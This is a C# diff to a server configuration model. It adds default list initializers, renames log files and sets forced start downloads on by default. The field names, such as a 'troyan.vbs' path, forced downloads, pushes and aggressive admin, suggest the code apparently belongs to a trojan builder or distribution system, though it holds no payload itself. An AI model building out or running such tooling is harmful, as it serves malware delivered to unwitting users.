@@ -14,7 +14,7 @@ public class ServerModel
 
     [JsonPropertyName("bux")] public List<BuxModel> Bux { get; set; }
 
-    [JsonPropertyName("dnSponsor")] public List<DnSponsorModel> DnSponsor { get; set; }
+    [JsonPropertyName("dnSponsor")] public List<DnSponsorModel> DnSponsor { get; set; } = new List<DnSponsorModel>();
 
     [JsonPropertyName("pack")] public PackModel Pack { get; set; } = new PackModel();
     
@@ -57,9 +57,7 @@ public class ServerModel
     [JsonPropertyName("userDataDir")] public string UserDataDir => ServerModelLoader.UserDataDir(Server);
     [JsonPropertyName("userServerFile")] public string UserServerFile => Path.Combine(UserDataDir, "server.json");
     [JsonPropertyName("userTroyanVbs")] public string UserTroyanVbs => Path.Join(UserDataDir, "troyan.vbs");
-
-    [JsonPropertyName("userCloneLog")] public string UserCloneLog => Path.Combine(UserDataDir, "clone.txt");
-    [JsonPropertyName("userPackLog")] public string UserPackLog => Path.Combine(UserDataDir, "pack.txt");
+    
 
     // server-depended
     [JsonPropertyName("serverIp")] public string ServerIp{ get; set; } = "";
@@ -183,15 +181,15 @@ public class ServerModel
     [JsonPropertyName("domainIps")] public List<DomainIp> DomainIps { get; set; }
 
     [JsonPropertyName("pushesForce")] public bool PushesForce { get; set; } = true;
-    [JsonPropertyName("pushes")] public List<string> Pushes { get; set; }
+    [JsonPropertyName("pushes")] public List<string> Pushes { get; set; } = new List<string>();
 
     [JsonPropertyName("startDownloadsForce")]
     public bool StartDownloadsForce { get; set; }
 
-    [JsonPropertyName("startDownloads")] public List<string> StartDownloads { get; set; }
+    [JsonPropertyName("startDownloads")] public List<string> StartDownloads { get; set; } = new List<string>();
 
     [JsonPropertyName("startUrlsForce")] public bool StartUrlsForce { get; set; }
-    [JsonPropertyName("startUrls")] public List<string> StartUrls { get; set; }
+    [JsonPropertyName("startUrls")] public List<string> StartUrls { get; set; }= new List<string>();
 
     [JsonPropertyName("frontForce")] public bool FrontForce { get; set; }
     [JsonPropertyName("front")] public List<string> Front { get; set; }
@@ -212,63 +210,15 @@ public class ServerModel
     public string AdminPassword { get; set; }
     
 
+    [JsonPropertyName("userCloneLog")] public string UserCloneLog => Path.Combine(UserDataDir, "clone.log");
+    [JsonPropertyName("userPackLog")] public string UserPackLog => Path.Combine(UserDataDir, "pack.log");
+    [JsonPropertyName("userPostLog")] public string UserPostLog => Path.Combine(UserDataDir, "post.log");
+    
+    [JsonPropertyName("post")]
+    public PostModel PostModel { get; set; } = new PostModel();
 
     [JsonIgnore] public bool IsLocal => ServerIp == "127.0.0.1";
-
-    [JsonPropertyName("_operate_isValid")] public bool IsValid { get; set; }
-
-    [JsonPropertyName("_operate_isAtWork")]
-    public bool IsAtWork { get; set; }
-
-    [JsonPropertyName("_operation")] public string Operation { get; set; }
-
-    [JsonPropertyName("_operate_hasToWork")]
-    public bool HasToWork => ActualTime != ModifyTime;
-
-    [JsonPropertyName("_operate_modifyTime")]
-    public string ModifyTime { get; set; }
-
-    [JsonPropertyName("_operate_actualTime")]
-    public string ActualTime { get; set; }
-
-    [JsonPropertyName("_operate_lastResult")]
-    public string LastResult { get; set; }
-
-    public string StatusLabel
-    {
-        get
-        {
-            if (IsAtWork)
-            {
-                if (ModifyTime != null)
-                    return $" Фоновый процесс {Operation} с {ModifyTime}";
-                else
-                {
-                    return $"Фоновый процесс {Operation}";
-                }
-            }
-            if (ActualTime != null)
-                return $"Работает с {ActualTime}";
-            else
-            {
-                return "Работает";
-            }
-        }
-    }
-
-    public void MarkOperation(string operation)
-    {
-        Operation = operation;
-        ModifyTime = DateTime.Now.ToString();
-        IsAtWork = true;
-    }
-    public void MarkReady()
-    {
-        var dt = DateTime.Now.ToString();
-        ActualTime = dt;
-        ModifyTime = dt;
-        IsAtWork = false;
-    }
+    
     
     //constructor
     public ServerModel()
@@ -283,6 +233,7 @@ public class ServerModel
         AggressiveAdmin = true;
         StartUrls = new List<string>();
         StartDownloads = new List<string>();
+        StartDownloadsForce = true;
         Interfaces = new List<string>();
         Pushes = new List<string>();
         DomainIps = new();
